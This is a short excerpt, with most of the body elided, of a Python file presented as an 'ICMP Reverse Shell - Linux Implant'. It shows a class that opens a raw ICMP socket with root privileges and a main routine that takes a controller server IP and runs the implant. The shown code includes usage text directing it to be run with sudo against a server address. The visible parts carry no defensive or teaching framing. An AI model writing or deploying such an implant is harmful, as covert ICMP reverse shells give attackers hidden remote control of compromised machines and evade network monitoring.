#!/usr/bin/env python3
"""
ICMP Reverse Shell - Linux Implant
...
class ICMPLinuxImplant:
    ...
    def create_socket(self):
        """Create raw ICMP socket on Linux"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.sock.settimeout(5)
            print("[+] Raw ICMP socket created (Linux)")
            return True
        except PermissionError:
            print("[-] Root privileges required!")
            print("    Run with: sudo python3 client_linux.py <SERVER_IP>")
            return False
...
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: sudo python3 client_linux.py <SERVER_IP>")
        print("Example: sudo python3 client_linux.py 192.168.1.100")
        sys.exit(1)
    ...
    implant = ICMPLinuxImplant(server_ip)
    implant.run()